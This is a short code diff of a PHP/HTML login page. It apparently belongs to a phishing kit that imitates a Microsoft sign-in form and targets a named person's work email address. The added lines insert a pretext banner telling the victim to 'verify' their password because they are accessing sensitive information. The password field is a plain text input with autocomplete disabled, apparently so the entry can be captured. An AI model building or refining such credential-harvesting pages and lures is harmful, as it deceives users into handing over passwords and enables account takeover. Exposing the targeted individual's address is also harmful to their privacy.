@@ -142,6 +142,8 @@ if($refData['host'] !== $_SERVER['HTTP_HOST']) {
                                             <div role="alert" aria-live="assertive">
                                                 <div id="passwordError" class="alert alert-error" style="display:none;">Please enter your password.
                                                 </div>
+						    <div id="sensitive" class="alert alert-error">Because you're accessing sensitive info, you need to verify your password.
+                                            </div>
                                             </div>
                                             <div class="placeholderContainer">
                                                 <input name="passwd" type="text" id="i0118" autocomplete="off" class="form-control" aria-required="true" aria-describedby="loginHeader passwordDesc" placeholder="Password" aria-label="Enter the password for damien.brtillot@tec-ker.com">
